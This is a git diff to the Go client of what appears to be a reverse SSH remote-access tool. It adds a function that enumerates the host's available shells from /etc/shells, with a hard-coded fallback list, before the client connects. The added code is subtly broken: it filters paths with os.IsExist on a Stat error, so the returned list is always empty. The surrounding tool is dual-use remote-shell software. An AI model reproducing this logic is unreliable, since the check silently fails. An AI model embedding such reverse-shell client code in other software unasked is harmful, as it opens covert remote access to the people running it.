@@ -1,6 +1,7 @@
 package client
 
 import (
+	"bufio"
 	"crypto/ed25519"
 	"crypto/rand"
 	"crypto/x509"
@@ -8,11 +9,46 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"os"
+	"strings"
 	"time"
 
 	"github.com/NHAS/reverse_ssh/internal"
 	"golang.org/x/crypto/ssh"
 )
+
+var shells []string
+
+func loadShells() (shells []string) {
+	file, err := os.Open("/etc/shells")
+	if err == nil {
+		defer file.Close()
+		scanner := bufio.NewScanner(file)
+		for scanner.Scan() {
+			line := scanner.Text()
+			if len(line) > 0 && line[0] == '#' {
+				continue
+			}
+			shells = append(shells, strings.TrimSpace(line))
+		}
+	} else {
+		shells = []string{
+			"/bin/bash",
+			"/bin/sh",
+			"C:\\Windows\\System32\\cmd.exe",
+			"/bin/zsh",
+		}
+	}
+
+	output := []string{}
+	for _, s := range shells {
+		if stats, err := os.Stat(s); os.IsExist(err) && !stats.IsDir() {
+			output = append(output, s)
+		}
+	}
+	return output
+
+}
 
 func Run(addr, serverPubKey string, reconnect bool) {
 
@@ -37,6 +73,8 @@ func Run(addr, serverPubKey string, reconnect bool) {
 	if err != nil {
 		log.Fatal("Parsing the ssh private key failed: ", err)
 	}
+
+	shells = loadShells()
 
 	config := &ssh.ClientConfig{
 		User: "0d87be75162ded36626cb97b0f5b5ef170465533",
